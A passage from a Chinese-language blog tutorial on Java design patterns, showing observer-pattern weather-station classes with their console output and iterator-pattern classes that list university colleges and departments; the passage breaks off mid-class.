class_">CurrentConditions</span>();<br>      <span class="hljs-comment">//创建 WeatherData 并将 接入方 currentConditions 传递到 WeatherData中</span><br>      <span class="hljs-type">WeatherData</span> <span class="hljs-variable">weatherData</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeatherData</span>(currentConditions);<br>      <br>      <span class="hljs-comment">//更新天气情况</span><br>      weatherData.setData(<span class="hljs-number">30</span>, <span class="hljs-number">150</span>, <span class="hljs-number">40</span>);<br>      <br>      <span class="hljs-comment">//天气情况变化</span><br>      System.out.println(<span class="hljs-string">&quot;============天气情况变化=============&quot;</span>);<br>      weatherData.setData(<span class="hljs-number">40</span>, <span class="hljs-number">160</span>, <span class="hljs-number">20</span>);<br>      <br><br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>CurrentConditions.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.observer;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 显示当前天气情况（可以理解成是气象站自己的网站）</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> Administrator</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CurrentConditions</span> &#123;<br>    <span class="hljs-comment">// 温度，气压，湿度</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">float</span> temperature;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">float</span> pressure;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">float</span> humidity;<br><br>    <span class="hljs-comment">//更新 天气情况，是由 WeatherData 来调用，我使用推送模式</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">(<span class="hljs-type">float</span> temperature, <span class="hljs-type">float</span> pressure, <span class="hljs-type">float</span> humidity)</span> &#123;<br>        <span class="hljs-built_in">this</span>.temperature = temperature;<br>        <span class="hljs-built_in">this</span>.pressure = pressure;<br>        <span class="hljs-built_in">this</span>.humidity = humidity;<br>        display();<br>    &#125;<br><br>    <span class="hljs-comment">//显示</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">display</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;***Today mTemperature: &quot;</span> + temperature + <span class="hljs-string">&quot;***&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;***Today mPressure: &quot;</span> + pressure + <span class="hljs-string">&quot;***&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;***Today mHumidity: &quot;</span> + humidity + <span class="hljs-string">&quot;***&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>WeatherData.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.observer;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 类是核心</span><br><span class="hljs-comment"> * 1. 包含最新的天气情况信息 </span><br><span class="hljs-comment"> * 2. 含有 CurrentConditions 对象</span><br><span class="hljs-comment"> * 3. 当数据有更新时，就主动的调用   CurrentConditions对象update方法(含 display), 这样他们（接入方）就看到最新的信息</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> Administrator</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WeatherData</span> &#123;<br>   <span class="hljs-keyword">private</span> <span class="hljs-type">float</span> temperatrue;<br>   <span class="hljs-keyword">private</span> <span class="hljs-type">float</span> pressure;<br>   <span class="hljs-keyword">private</span> <span class="hljs-type">float</span> humidity;<br>   <span class="hljs-keyword">private</span> CurrentConditions currentConditions;<br>   <span class="hljs-comment">//加入新的第三方</span><br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">WeatherData</span><span class="hljs-params">(CurrentConditions currentConditions)</span> &#123;<br>      <span class="hljs-built_in">this</span>.currentConditions = currentConditions;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">float</span> <span class="hljs-title function_">getTemperature</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> temperatrue;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">float</span> <span class="hljs-title function_">getPressure</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> pressure;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">float</span> <span class="hljs-title function_">getHumidity</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> humidity;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dataChange</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">//调用 接入方的 update</span><br>      currentConditions.update(getTemperature(), getPressure(), getHumidity());<br>   &#125;<br><br>   <span class="hljs-comment">//当数据有更新时，就调用 setData</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setData</span><span class="hljs-params">(<span class="hljs-type">float</span> temperature, <span class="hljs-type">float</span> pressure, <span class="hljs-type">float</span> humidity)</span> &#123;<br>      <span class="hljs-built_in">this</span>.temperatrue = temperature;<br>      <span class="hljs-built_in">this</span>.pressure = pressure;<br>      <span class="hljs-built_in">this</span>.humidity = humidity;<br>      <span class="hljs-comment">//调用dataChange， 将最新的信息 推送给 接入方 currentConditions</span><br>      dataChange();<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>执行程序，输出结果：</p></blockquote><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-strong">**<span class="hljs-emphasis">*Today mTemperature: 30.0*</span>**</span><br><span class="hljs-strong">**<span class="hljs-emphasis">*Today mPressure: 150.0*</span>**</span><br><span class="hljs-strong">**<span class="hljs-emphasis">*Today mHumidity: 40.0*</span>**</span><br>============天气情况变化=============<br><span class="hljs-strong">**<span class="hljs-emphasis">*Today mTemperature: 40.0*</span>**</span><br><span class="hljs-strong">**<span class="hljs-emphasis">*Today mPressure: 160.0*</span>**</span><br><span class="hljs-strong">**<span class="hljs-emphasis">*Today mHumidity: 20.0*</span>**</span><br></code></pre></td></tr></table></figure><h3 id="观察者模式解决天气预报需求"><a class="markdownIt-Anchor" href="#观察者模式解决天气预报需求"></a> 观察者模式解决天气预报需求</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230104143905498.png" alt="image-20230104143905498" /></p><p><code>Client.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.iterator;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 相当于一个大学</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         */</span><br>        List&lt;College&gt; collegeList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;College&gt;();<br><br>        <span class="hljs-comment">//创建学院</span><br>        <span class="hljs-type">ComputerCollege</span> <span class="hljs-variable">computerCollege</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ComputerCollege</span>();<br>        <span class="hljs-type">InfoCollege</span> <span class="hljs-variable">infoCollege</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InfoCollege</span>();<br><br>        collegeList.add(computerCollege);<br>        collegeList.add(infoCollege);<br><br>        <span class="hljs-type">OutPutImpl</span> <span class="hljs-variable">outPutImpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OutPutImpl</span>(collegeList);<br>        outPutImpl.printCollege();<br><br>    &#125;<br><br><br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>College.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.iterator;<br><br><span class="hljs-keyword">import</span> java.util.Iterator;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">College</span> &#123;<br>   <br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span>;<br>   <br>   <span class="hljs-comment">//增加系的方法</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addDepartment</span><span class="hljs-params">(String name, String desc)</span>;<br>   <br>   <span class="hljs-comment">//返回一个迭代器,遍历</span><br>   <span class="hljs-keyword">public</span> Iterator  <span class="hljs-title function_">createIterator</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>ComputerCollege.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.iterator;<br><br><span class="hljs-keyword">import</span> java.util.Iterator;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ComputerCollege</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">College</span> &#123;<br><br>   Department[] departments;<br>   <span class="hljs-type">int</span> <span class="hljs-variable">numOfDepartment</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span> ;<span class="hljs-comment">// 保存当前数组的对象个数</span><br>   <br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">ComputerCollege</span><span class="hljs-params">()</span> &#123;<br>      departments = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Department</span>[<span class="hljs-number">5</span>];<br>      addDepartment(<span class="hljs-string">&quot;Java专业&quot;</span>, <span class="hljs-string">&quot; Java专业 &quot;</span>);<br>      addDepartment(<span class="hljs-string">&quot;PHP专业&quot;</span>, <span class="hljs-string">&quot; PHP专业 &quot;</span>);<br>      addDepartment(<span class="hljs-string">&quot;大数据专业&quot;</span>, <span class="hljs-string">&quot; 大数据专业 &quot;</span>);<br>      <br>   &#125;<br>   <br>   <br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;计算机学院&quot;</span>;<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addDepartment</span><span class="hljs-params">(String name, String desc)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-type">Department</span> <span class="hljs-variable">department</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Department</span>(name, desc);<br>      departments[numOfDepartment] = department;<br>      numOfDepartment += <span class="hljs-number">1</span>;<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> Iterator <span class="hljs-title function_">createIterator</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ComputerCollegeIterator</span>(departments);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>ComputerCollegeIterator.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.iterator;<br><br><span class="hljs-keyword">import</span> java.util.Iterator;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ComputerCollegeIterator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Iterator</span> &#123;<br><br>   <span class="hljs-comment">//这里我们需要Department 是以怎样的方式存放=&gt;数组</span><br>   Department[] departments;<br>   <span class="hljs-type">int</span> <span class="hljs-variable">position</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; <span class="hljs-comment">//遍历的位置</span><br>   <br>   <br>   <br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">ComputerCollegeIterator</span><span class="hljs-params">(Department[] departments)</span> &#123;<br>      <span class="hljs-built_in">this</span>.departments = departments;<br>   &#125;<br><br>   <span class="hljs-comment">//判断是否还有下一个元素</span><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">hasNext</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">if</span>(position &gt;= departments.length || departments[position] == <span class="hljs-literal">null</span>) &#123;<br>         <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>      &#125;<span class="hljs-keyword">else</span> &#123;<br>      <br>         <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>      &#125;<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">next</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-type">Department</span> <span class="hljs-variable">department</span> <span class="hljs-operator">=</span> departments[position];<br>      position += <span class="hljs-number">1</span>;<br>      <span class="hljs-keyword">return</span> department;<br>   &#125;<br>   <br>   <span class="hljs-comment">//删除的方法，默认空实现</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">remove</span><span class="hljs-params">()</span> &#123;<br>      <br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Department.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.iterator;<br><br><span class="hljs-comment">//系</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Department</span> &#123;<br><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> String desc;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Department</span><span class="hljs-params">(String name, String desc)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.desc = desc;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getDesc</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> desc;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setDesc</span><span class="hljs-params">(String desc)</span> &#123;<br>        <span class="hljs-built_in">this</span>.desc = desc;<br>    &#125;<br><br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>InfoColleageIterator.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.iterator;<br><br><span class="hljs-keyword">import</span> java.util.Iterator;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InfoColleageIterator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Iterator</span> &#123;<br><br><br>    List&lt;Department&gt; departmentList; <span class="hljs-comment">// 信息工程学院是以List方式存放系</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<span class="hljs-comment">//索引</span><br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">InfoColleageIterator</span><span class="hljs-params">(List&lt;Department&gt; departmentList)</span> &#123;<br>        <span class="hljs-built_in">this</span>.departmentList = departmentList;<br>    &#125;<br><br>    <span class="hljs-comment">//判断list中还有没有下一个元素</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">hasNext</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// TODO Auto-generated method stub</span><br>        <span class="hljs-keyword">if</span> (index &gt;= departmentList.size() - <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            index += <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">next</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// TODO Auto-generated method stub</span><br>        <span class="hljs-keyword">return</span> departmentList.get(index);<br>    &#125;<br><br>    <span class="hljs-comment">//空实现remove</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">remove</span><span class="hljs-params">()</span> &#123;<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>InfoCollege.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.iterator;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.Iterator;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InfoCollege</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">College</span> &#123;<br><br>   List&lt;Department&gt; departmentList;<br>   <br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">InfoCollege</span><span class="hljs-params">()</span> &#123;<br>      departmentList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;Department&gt;();<br>      addDepartment(<span class="hljs-string">&quot;信息安全专业&quot;</span>, <span class="hljs-string">&quot; 信息安全专业 &quot;</span>);<br>      addDepartment(<span class="hljs-string">&quot;网络安全专业&quot;</span>, <span class="hljs-string">&quot; 网络安全专业 &quot;</span>);<br>      addDepartment(<span class="hljs-string">&quot;服务器安全专业&quot;</span>, <span class="hljs-string">&quot; 服务器安全专业 &quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;信息工程学院&quot;</span>;<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addDepartment</span><span class="hljs-params">(String name, String desc)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-type">Department</span> <span class="hljs-variable">department</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Department</span>(name, desc);<br>      departmentList.add(department);<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> Iterator <span class="hljs-title function_">createIterator</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InfoColleageIterator</span>(departmentList);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>OutPutImpl.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.iterator;<br><br><span class="hljs-keyword">import</span> java.util.Iterator;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OutPutImpl</span> &#123;<br>   <br>   <span class="hljs-comment">//学院集合</span><br>   List&lt;College&gt; collegeList;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">OutPutImpl</span><span class="hljs-params">(List&lt;College&gt; collegeList)</span> &#123;<br>      <br>      <span class="hljs-built_in">this</span>.collegeList = collegeList;<br>   &#125;<br>   <span class="hljs-comment">//遍历所有学院,然后调用printDepartment 输出各个学院的系</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printCollege</span><span class="hljs-params">()</span> &#123;<br>      <br>      <span class="hljs-comment">//从collegeList 取出所有学院, Java 中的 List 已经实现Iterator</span><br>      Iterator&lt;College&gt; iterator = collegeList.iterator();<br>      <br>      <span class="hljs-keyword">while</span>(iterator.hasNext()) &#123;<br>         <span class="hljs-comment">//取出一个学院</span><br>         <span class="hljs-type">College</span> <span 